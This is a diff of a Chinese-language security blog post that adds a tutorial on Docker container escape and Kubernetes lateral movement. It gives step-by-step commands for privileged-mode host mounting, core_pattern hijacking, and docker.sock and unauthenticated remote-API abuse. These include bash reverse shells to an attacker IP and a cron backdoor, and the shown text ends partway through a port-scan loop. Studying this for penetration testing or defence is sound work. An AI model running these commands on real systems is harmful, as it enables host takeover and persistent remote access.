@@ -5,7 +5,7 @@
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="noindex, nofollow">
-<title>K8s | h4xk0r blog</title>
+<title>K8s&amp;Docker | h4xk0r blog</title>
 <meta name="keywords" content="">
 <meta name="description" content="Docker
 docker是一种轻量级容器技术,可将应用及其依赖打包成标准化单元
@@ -59,7 +59,7 @@ K8s核心组件
 Pod">
 <meta name="author" content="h4xk0r">
 <link rel="canonical" href="http://localhost:1313/posts/k8s/">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.da54c57d4305d35203753b611a507d3c3386f2dc610c5ecafc9137dfc0197499.css" integrity="sha256-2lTFfUMF01IDdTthGlB9PDOG8txhDF7K/JE338AZdJk=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.314abab0bce79c9458c3bcc909ca5440767e8fa2822428ed33ce608ca6f66fa0.css" integrity="sha256-MUq6sLznnJRYw7zJCcpUQHZ&#43;j6KCJCjtM85gjKb2b6A=" rel="preload stylesheet" as="style">
 <link rel="icon" href="http://localhost:1313/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
 <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
@@ -114,11 +114,6 @@ Pod">
         </div>
         <ul id="menu">
             <li>
-                <a href="http://localhost:1313/posts/" title="档案">
-                    <span>档案</span>
-                </a>
-            </li>
-            <li>
                 <a href="http://localhost:1313/search/" title="搜索 (Alt &#43; /)" accesskey=/>
                     <span>搜索</span>
                 </a>
@@ -142,9 +137,9 @@ Pod">
   <header class="post-header">
     
     <h1 class="post-title entry-hint-parent">
-      K8s
+      K8s&amp;Docker
     </h1>
-    <div class="post-meta"><span title='2026-03-30 21:28:24 +0800 CST'>March 30, 2026</span>&nbsp;·&nbsp;<span>2 min</span>&nbsp;·&nbsp;<span>h4xk0r</span>
+    <div class="post-meta"><span title='2026-03-30 21:28:24 +0800 CST'>March 30, 2026</span>&nbsp;·&nbsp;<span>6 min</span>&nbsp;·&nbsp;<span>h4xk0r</span>
 
 </div>
   </header> <div class="toc">
@@ -153,7 +148,7 @@ Pod">
             <span class="details">Table of Contents</span>
         </summary>
 
-        <div class="inner"><ul>
+        <div class="inner"><ul><ul>
                 <li>
                     <a href="#docker" aria-label="Docker">Docker</a></li>
                 <li>
@@ -180,9 +175,72 @@ Pod">
                 <li>
                     <a href="#%e9%98%b6%e6%ae%b5%e5%9b%9b-%e8%8a%82%e7%82%b9%e5%88%9b%e5%bb%bapod" aria-label="阶段四: 节点创建POD">阶段四: 节点创建POD</a></li>
                 <li>
-                    <a href="#%e9%98%b6%e6%ae%b5%e4%ba%94-%e6%9c%8d%e5%8a%a1%e6%9a%b4%e9%9c%b2%e4%b8%8e%e8%ae%bf%e9%97%ae" aria-label="阶段五: 服务暴露与访问">阶段五: 服务暴露与访问</a></li>
+                    <a href="#%e9%98%b6%e6%ae%b5%e4%ba%94-%e6%9c%8d%e5%8a%a1%e6%9a%b4%e9%9c%b2%e4%b8%8e%e8%ae%bf%e9%97%ae" aria-label="阶段五: 服务暴露与访问">阶段五: 服务暴露与访问</a></li></ul>
+                </li>
                 <li>
-                    <a href="#%e5%9f%ba%e4%ba%8ek8s%e4%b8%8a%e7%ba%bf%e4%b8%bb%e8%8a%82%e7%82%b9" aria-label="基于k8s上线主节点">基于k8s上线主节点</a>
+                    <a href="#docker%e9%80%83%e9%80%b8" aria-label="Docker逃逸">Docker逃逸</a><ul>
+                        <ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#%e5%88%a4%e6%96%ad%e6%98%af%e5%90%a6%e5%9c%a8%e5%ae%b9%e5%99%a8%e4%b8%ad%e7%9a%84%e6%96%b9%e6%b3%95" aria-label="判断是否在容器中的方法">判断是否在容器中的方法</a></li></ul>
+                    </ul>
+                    
+                <li>
+                    <a href="#%e9%85%8d%e7%bd%ae%e4%b8%8d%e5%bd%93" aria-label="配置不当">配置不当</a><ul>
+                        
+                <li>
+                    <a href="#%e7%89%b9%e6%9d%83%e6%a8%a1%e5%bc%8f" aria-label="特权模式:">特权模式:</a></li>
+                <li>
+                    <a href="#%e6%95%8f%e6%84%9f%e7%9b%ae%e5%bd%95%e6%8c%82%e8%bd%bd" aria-label="敏感目录挂载">敏感目录挂载</a><ul>
+                        
+                <li>
+                    <a href="#proc%e7%9b%ae%e5%bd%95%e9%80%83%e9%80%b8" aria-label="/proc目录逃逸">/proc目录逃逸</a></li>
+                <li>
+                    <a href="#%e5%a5%97%e6%8e%a5%e5%ad%97%e6%96%87%e4%bb%b6%e9%80%83%e9%80%b8socket" aria-label="套接字文件逃逸(socket)">套接字文件逃逸(socket)</a></li></ul>
+                </li>
+                <li>
+                    <a href="#docker-remote-api%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae" aria-label="Docker remote api未授权访问">Docker remote api未授权访问</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e5%86%85%e6%a0%b8%e6%bc%8f%e6%b4%9e" aria-label="内核漏洞">内核漏洞</a></li>
+                <li>
+                    <a href="#%e7%bb%84%e4%bb%b6%e6%bc%8f%e6%b4%9e" aria-label="组件漏洞">组件漏洞</a></li></ul>
+                </li></ul>
+                    
+                <li>
+                    <a href="#k8s%e6%a8%aa%e5%90%91" aria-label="K8s横向">K8s横向</a><ul>
+                        
+                <li>
+                    <a href="#1-pod-to-pod" aria-label="1. Pod-to-Pod">1. Pod-to-Pod</a><ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e6%8e%a2%e6%b5%8b%e6%a8%aa%e5%90%91%e7%9b%ae%e6%a0%87" aria-label="信息收集探测横向目标">信息收集探测横向目标</a></li>
+                <li>
+                    <a href="#%e5%b8%b8%e7%94%a8%e6%94%bb%e5%87%bb%e5%88%a9%e7%94%a8%e6%96%b9%e5%bc%8f" aria-label="常用攻击利用方式">常用攻击利用方式</a></li></ul>
+                    </ul>
+                </li>
+                <li>
+                    <a href="#2-rbac%e6%bb%a5%e7%94%a8" aria-label="2. RBAC滥用">2. RBAC滥用</a><ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#%e6%bb%a5%e7%94%a8%e5%88%9b%e5%bb%ba%e6%9d%83%e9%99%90create" aria-label="滥用创建权限(create)">滥用创建权限(create)</a></li>
+                <li>
+                    <a href="#%e6%bb%a5%e7%94%a8%e8%bf%9c%e7%a8%8b%e6%89%a7%e8%a1%8c%e6%9d%83%e9%99%90" aria-label="滥用远程执行权限">滥用远程执行权限</a></li>
+                <li>
+                    <a href="#%e6%bb%a5%e7%94%a8%e5%87%ad%e6%8d%ae%e6%9f%a5%e7%9c%8b%e6%9d%83%e9%99%90" aria-label="滥用凭据查看权限">滥用凭据查看权限</a></li>
+                <li>
+                    <a href="#%e6%bb%a5%e7%94%a8%e7%bb%91%e5%ae%9a%e5%92%8c%e8%b6%8a%e6%9d%83" aria-label="滥用绑定和越权">滥用绑定和越权</a></li>
+                <li>
+                    <a href="#%e6%bb%a5%e7%94%a8%e7%94%a8%e6%88%b7%e4%bc%aa%e8%a3%85" aria-label="滥用用户伪装">滥用用户伪装</a></li>
+                <li>
+                    <a href="#%e5%bf%ab%e9%80%9f%e7%a1%ae%e8%ae%a4token%e6%9d%83%e9%99%90" aria-label="快速确认Token权限">快速确认Token权限</a></li></ul>
+                    </ul>
+                </li>
+                <li>
+                    <a href="#3-node-to-node" aria-label="3. node-to-node">3. node-to-node</a>
                 </li>
             </ul>
             </li>
@@ -404,9 +462,336 @@ pod的IP是变动的,但是Service提供了一个固定的虚拟IP,它将请求�
 <li>pod
 到达容器内的web应用</li>
 </ol>
-<h3 id="基于k8s上线主节点">基于k8s上线主节点<a hidden class="anchor" aria-hidden="true" href="#基于k8s上线主节点">#</a></h3>
-<p>节点污染机制</p>
-
+<h2 id="docker逃逸">Docker逃逸<a hidden class="anchor" aria-hidden="true" href="#docker逃逸">#</a></h2>
+<p><strong>注:</strong> docker逃逸是k8s横向的前提</p>
+<h5 id="判断是否在容器中的方法">判断是否在容器中的方法<a hidden class="anchor" aria-hidden="true" href="#判断是否在容器中的方法">#</a></h5>
+<ol>
+<li>
+<p>执行<code>systemd-detect-virt</code>命令,检测当前系统是否运行在虚拟化环境（虚拟机）或容器中</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>输出结果,说明
+</span></span><span style="display:flex;"><span>kvm,KVM <span style="color:#f92672">(</span>Kernel-based Virtual Machine<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>qemu,QEMU 模拟器
+</span></span><span style="display:flex;"><span>vmware,VMware 虚拟机
+</span></span><span style="display:flex;"><span>microsoft,Microsoft Hyper-V
+</span></span><span style="display:flex;"><span>oracle,Oracle VirtualBox
+</span></span><span style="display:flex;"><span>xen,Xen 虚拟化平台
+</span></span><span style="display:flex;"><span>uml,User-mode Linux
+</span></span><span style="display:flex;"><span>lxc,Linux Containers <span style="color:#f92672">(</span>LXC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>docker,Docker 容器
+</span></span><span style="display:flex;"><span>podman,Podman 容器
+</span></span><span style="display:flex;"><span>systemd-nspawn,systemd 容器
+</span></span><span style="display:flex;"><span>none,未检测到虚拟化（物理机）
+</span></span></code></pre></div></li>
+<li>
+<p>通过主机名或者进程判断</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 查看主机名(主机名可修改,不一定准确)</span>
+</span></span><span style="display:flex;"><span>hostname
+</span></span><span style="display:flex;"><span>特征: docker中主机名通常是一串随机的 <span style="color:#ae81ff">12</span> 位十六进制字符（例如 8a2f4c3b1e9d），或者在 Kubernetes 中表现为 deployment-name-xxxxxx-yyyyy
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 查看进程</span>
+</span></span><span style="display:flex;"><span>ps aux 或 pstree
+</span></span><span style="display:flex;"><span>特征:
+</span></span><span style="display:flex;"><span>containerd-shim：Docker 容器的标志。
+</span></span><span style="display:flex;"><span>tini：很多 Docker 镜像的默认启动入口。
+</span></span><span style="display:flex;"><span>pause：在 Kubernetes Pod 中，每个容器组都有一个 pause 容器占位。
+</span></span></code></pre></div></li>
+<li>
+<p>检查<code>.dockerenv</code>文件,docker启动会在容器根目录创建一个名为<code>.dockerenv</code>的文件</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls -la /.dockerenv
+</span></span></code></pre></div></li>
+<li>
+<p>查看cgroup</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /proc/1/cgroup
+</span></span><span style="display:flex;"><span>特征:
+</span></span><span style="display:flex;"><span>结果中包含docker字样,就是在docker中
+</span></span><span style="display:flex;"><span>包含kubepods就是在K8s中
+</span></span></code></pre></div><p>一个快速识别的命令</p>
+</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep -qi <span style="color:#e6db74">&#34;docker\|kubepods&#34;</span> /proc/1/cgroup <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;Is Docker&#34;</span> <span style="color:#f92672">||</span> echo <span style="color:#e6db74">&#34;Not Docker&#34;</span>
+</span></span></code></pre></div><p><strong>Docker逃逸的造成的根本原因可以大致分为以下几类:</strong></p>
+<ol>
+<li><strong>配置不当:</strong> 滥用特权模式(<code>privileged: true</code>), 权限配置不当, 挂载敏感目录</li>
+<li><strong>宿主机内核漏洞</strong>: Docker和宿主机共享内核,如果宿主机存在内核漏洞就可能导致逃逸</li>
+<li><strong>容器组件自身漏洞:</strong> 负责管理容器生命周期的 <code>runc(CVE-2019-5736)</code>、<code>containerd(CVE-2020-15257)</code> 或 Docker Daemon 本身）如果存在代码逻辑漏洞,也会导致逃逸</li>
+<li><strong>敏感信息泄露:</strong> 如在docker中存在ssh密码或者云环境的相关凭据(Kubernetes的ServiceAccount Token, AccessKey等)</li>
+</ol>
+<h3 id="配置不当">配置不当<a hidden class="anchor" aria-hidden="true" href="#配置不当">#</a></h3>
+<p>最多的情况是使用了特权模式<code>privileged: true</code>或者是挂载了敏感目录</p>
+<h4 id="特权模式">特权模式:<a hidden class="anchor" aria-hidden="true" href="#特权模式">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>判断是否是特权模式
+</span></span><span style="display:flex;"><span>cat /proc/self/status | grep CapEff    如果是特权模式有0000003fffffffff这样的特征
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0. 查看真实的磁盘</span>
+</span></span><span style="display:flex;"><span>fdisk -l
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1. 创建挂载目录</span>
+</span></span><span style="display:flex;"><span>mkdir /tmp/host_disk
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. 将宿主机的根分区挂载到容器内（这里以 /dev/sda1 为例）</span>
+</span></span><span style="display:flex;"><span>mount /dev/sda1 /tmp/host_disk
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3. 这时候就有了宿主机的操作权限.可以写入密码或者密钥等操作或者使用chroot逃逸</span>
+</span></span><span style="display:flex;"><span>chroot /tmp/host_disk		<span style="color:#75715e">#进入宿主机的shell环境</span>
+</span></span></code></pre></div><h4 id="敏感目录挂载">敏感目录挂载<a hidden class="anchor" aria-hidden="true" href="#敏感目录挂载">#</a></h4>
+<p>挂载一些敏感目录如根目录,<code>/proc</code>目录,或者挂载套接字文件都会导致逃逸</p>
+<h5 id="proc目录逃逸"><code>/proc</code>目录逃逸<a hidden class="anchor" aria-hidden="true" href="#proc目录逃逸">#</a></h5>
+<p><strong>原理:</strong> <code>/proc</code> 包含了 Linux 内核和进程的动态信息。其中 <code>/proc/sys/kernel/core_pattern</code> 负责配置程序崩溃（Core Dump）时内核如何处理。如果容器能写这个文件，就可以通过在容器内故意触发一个进程崩溃，让<strong>宿主机内核</strong>去执行指定的恶意脚本。</p>
+<p><strong>利用方式:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 0 确认是否挂载,且core_pattern是否有写入权限</span>
+</span></span><span style="display:flex;"><span>mount | grep proc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1 找到容器在宿主机上的绝对路径</span>
+</span></span><span style="display:flex;"><span>cat /proc/self/mountinfo | grep UpperDir
+</span></span><span style="display:flex;"><span>会返回类似 /var/lib/docker/.../.../diff 的路径
+</span></span><span style="display:flex;"><span>说明在宿主机上的路径是/var/lib/docker/.../.../diff/tmp/shell.sh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2 在容器内/tmp/shell.sh写入反弹shell,并给执行权限</span>
+</span></span><span style="display:flex;"><span>cat &lt; /tmp/shell.sh
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
+</span></span><span style="display:flex;"><span>bash -i &gt;&amp; /dev/tcp/10.10.10.10/4444 0&gt;&amp;<span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>EOF
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chmod +x /tmp/shell.sh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3 将推导出的宿主机路径,写入到挂载的core_pattern文件中</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;|/var/lib/docker/overlay2/a1b2c3d4e5.../diff/tmp/shell.sh&#34;</span> &gt; /host_proc/sys/kernel/core_pattern
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 4 vps上启动监听</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 5 制造进行崩溃</span>
+</span></span><span style="display:flex;"><span>// crash.c
+</span></span><span style="display:flex;"><span>int main<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    int *p <span style="color:#f92672">=</span> 0;
+</span></span><span style="display:flex;"><span>    *p <span style="color:#f92672">=</span> 1; // 故意向内存地址 <span style="color:#ae81ff">0</span> 写数据，引发段错误
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> 0;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><h5 id="套接字文件逃逸socket">套接字文件逃逸(socket)<a hidden class="anchor" aria-hidden="true" href="#套接字文件逃逸socket">#</a></h5>
+<p>docker.sock是docker的守护进程默认监听的Unix域套接字,用于docker架构中的本地进程通信(IPC). Docker的命令如: <code>docker run</code>, <code>docker ps</code>等都是后台通过这个套接字发送HTTP请求给Docker Daemon来控制容器</p>
+<p><strong>原理:</strong> 由于 Docker Daemon 本身在宿主机上是以 <strong><code>root</code> 权限</strong>运行的，如果容器内部被错误地挂载了 <code>docker.sock</code>，并且容器内进程有写权限，那么攻击者就可以直接向这个套接字发送恶意的 API 请求，强迫宿主机替自己生出一个具有最高权限的“兄弟容器”，从而接管整个宿主机</p>
+<p><strong>利用步骤:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 检查docker.sock是否存在,并测试能否与宿主机的Docker Deamon通信,并获取API版本号</span>
+</span></span><span style="display:flex;"><span>curl --unix-socket /var/run/docker.sock http://localhost/version
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 下载镜像(通常选择现有的轻量化镜像如alpine,如果没有通过API让宿主机后台下载)</span>
+</span></span><span style="display:flex;"><span>curl --unix-socket /var/run/docker.sock -X POST <span style="color:#e6db74">&#34;http://localhost/v1.41/images/create?fromImage=alpine&amp;tag=latest&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 构造JSON创建容器</span>
+</span></span><span style="display:flex;"><span>需要向/containers/create 接口发送一个 POST 请求,并
+</span></span><span style="display:flex;"><span>1. 将宿主机的根目录 / 挂载到新容器的 /host_root。
+</span></span><span style="display:flex;"><span>2. 让新容器在宿主机中以 Host 网络模式运行，或开启特权。
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>curl --unix-socket /var/run/docker.sock -X POST -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -d <span style="color:#e6db74">&#39;{
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;Image&#34;: &#34;alpine:latest&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;Cmd&#34;: [&#34;/bin/sh&#34;, &#34;-c&#34;, &#34;chroot /host_root /bin/bash -c \&#34;bash -i &gt;&amp; /dev/tcp/10.10.10.10/4444 0&gt;&amp;1\&#34;&#34;],
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;HostConfig&#34;: {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &#34;Binds&#34;: [&#34;/:/host_root&#34;]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    }
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  }&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  http://localhost/v1.41/containers/create
+</span></span><span style="display:flex;"><span>  之后返回JSON,内包含容器ID
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># 启动容器</span>
+</span></span><span style="display:flex;"><span>  curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/e9c3a2f8<span style="color:#f92672">(</span>id<span style="color:#f92672">)</span>/start
+</span></span></code></pre></div><p>扩展: 有些socket逃逸不需要错误挂载<code>docker.sock</code></p>
+<h4 id="docker-remote-api未授权访问">Docker remote api未授权访问<a hidden class="anchor" aria-hidden="true" href="#docker-remote-api未授权访问">#</a></h4>
+<p>本质和docker.sock逃逸很像,都是通过Docker Daemon进行逃逸,如果没有配置TLS证书就会导致未授权,不同的是<code>docker.sock</code> 走的是本地文件 IPC 通信，而 <code>Remote API</code> 走的是网络 TCP 通信（默认端口为 <strong>2375</strong> 纯文本 或 <strong>2376</strong> 开启 TLS）可以根据攻击者的位置分为两种场景</p>
+<ol>
+<li><strong>远程控制（Host Compromise）：</strong> 攻击者从外网直接向暴露在公网的 Docker 端口发指令，直接拿下新宿主机。</li>
+<li><strong>容器逃逸（Container Escape）：</strong> 攻击者已经在一个低权限容器内，发现宿主机把 2375 端口暴露在了内网（或者容器能访问到宿主机的内网 IP），从而通过网络套接字（TCP Socket）反向接管宿主机。</li>
+</ol>
+<p><strong>方法一: 通过本地docker命令逃逸</strong></p>
+<p>条件: 安装docker命令行工具</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 测试开放的端口是否存在未授权</span>
+</span></span><span style="display:flex;"><span>docker -H tcp://&lt;目标IP&gt;:2375 version
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#启动一个挂载根目录的特权容器</span>
+</span></span><span style="display:flex;"><span>docker -H tcp://&lt;目标IP&gt;:2375 run -it -v /:/host_root alpine sh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#通过各种方式写后门如ssh密钥,这里用计划任务</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;* * * * * root bash -i &gt;&amp; /dev/tcp/&lt;攻击者IP&gt;/&lt;端口&gt; 0&gt;&amp;1&#34;</span> &gt; /host_root/etc/cron.d/unauth_escape
+</span></span></code></pre></div><p><strong>方法二: 利用curl请求进行逃逸</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#向目标的 /containers/create 接口发送 POST 请求。在 JSON 载荷中指定挂载宿主机根目录 /:/host_root，并让其执行写定时任务的命令</span>
+</span></span><span style="display:flex;"><span>curl -X POST -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -d <span style="color:#e6db74">&#39;{
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;Image&#34;: &#34;alpine:latest&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;Cmd&#34;: [&#34;sh&#34;, &#34;-c&#34;, &#34;echo \&#34;* * * * * root bash -i &gt;&amp; /dev/tcp/&lt;攻击者IP&gt;/4444 0&gt;&amp;1\&#34; &gt; /host_root/etc/cron.d/unauth_escape&#34;],
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;HostConfig&#34;: {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &#34;Binds&#34;: [&#34;/:/host_root&#34;]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    }
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  }&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  http://&lt;目标IP&gt;:2375/containers/create
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span> 返回容器ID
+</span></span><span style="display:flex;"><span> <span style="color:#75715e"># 启动容器触发反弹shell</span>
+</span></span><span style="display:flex;"><span> curl -X POST http://&lt;目标IP&gt;:2375/containers/8a7b6c5d.../start
+</span></span></code></pre></div><h3 id="内核漏洞">内核漏洞<a hidden class="anchor" aria-hidden="true" href="#内核漏洞">#</a></h3>
+<p><strong>漏洞原因</strong>: 是因为docker为了结束资源和物理机共用内核,所以宿主机有内核漏洞,docker也存在漏洞</p>
+<p><strong>怎么判断是否有内核漏洞</strong></p>
+<ol>
+<li>检查内核版本</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>uname -a
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 或者查看伪文件系统信息</span>
+</span></span><span style="display:flex;"><span>cat /proc/version
+</span></span></code></pre></div><ol start="2">
+<li>
+<p>检查cgroupsv版本</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 查看当前环境挂载的是 cgroup v1 还是 v2</span>
+</span></span><span style="display:flex;"><span>mount | grep cgroup
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>如何判断：如果看到挂载大批 cgroup on /sys/fs/cgroup/memory 等独立目录，说明是 cgroups v1。如果该目录下允许容器修改 release_agent 且容器拥有 CAP_SYS_ADMIN 权限，则大概率存在内核机制逃逸漏洞
+</span></span></code></pre></div></li>
+</ol>
+<h3 id="组件漏洞">组件漏洞<a hidden class="anchor" aria-hidden="true" href="#组件漏洞">#</a></h3>
+<p><strong>怎么探测组件漏洞</strong></p>
+<ol>
+<li>通过docker.sock</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 如果容器内有 curl，直接查 API 的 version 接口</span>
+</span></span><span style="display:flex;"><span>curl --unix-socket /var/run/docker.sock http://localhost/version
+</span></span></code></pre></div><ol start="2">
+<li>上传自动化工具</li>
+</ol>
+<h1 id="k8s横向">K8s横向<a hidden class="anchor" aria-hidden="true" href="#k8s横向">#</a></h1>
+<h2 id="1-pod-to-pod">1. Pod-to-Pod<a hidden class="anchor" aria-hidden="true" href="#1-pod-to-pod">#</a></h2>
+<p>在k8s中pod之间默认是可以进行网络通信的即使不在一个Namespace,除非配置了网络隔离策略<code>NetworkPolicy</code></p>
+<p>补充:</p>
+<ul>
+<li><strong>Node节点:</strong>  node是物理划分,Pod运行在不同的机器(Node)上,仅进行计算机的资源分配</li>
+<li><strong>Namespace命名空间:</strong> Namespace是逻辑划分,将Pod分成不同的组,但是不会提供网络隔离</li>
+</ul>
+<h4 id="信息收集探测横向目标"><strong>信息收集探测横向目标</strong><a hidden class="anchor" aria-hidden="true" href="#信息收集探测横向目标">#</a></h4>
+<ol>
+<li>可以使用<code>env</code>或<code>printenv</code>探测其他内部IP和端口</li>
+<li>如果集群挂载了CoreDNS可以利用 DNS 解析规律去Fuzz其他服务</li>
+</ol>
+<pre tabindex="0"><code>命名格式: &lt;service-name&gt;.&lt;namespace&gt;.svc.cluster.local
+</code></pre><p>3, 可以使用工具或者脚本进行网络探测</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> ip in <span style="color:#f92672">{</span>1..254<span style="color:#f92672">}</span>; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> port in <span style="color:#ae81ff">80</span> <span style="color:#ae81ff">6379</span> <span style="color:#ae81ff">8080</span> 27017; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>echo &lt; /dev/tcp/10.244.1.$ip/$port<span style="color:#f92672">)</span> &amp;&gt;/dev/null <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;Found: 10.244.1.</span>$ip<span style="color:#e6db74">:</span>$port<span style="color:#e6db74">&#34;</span>
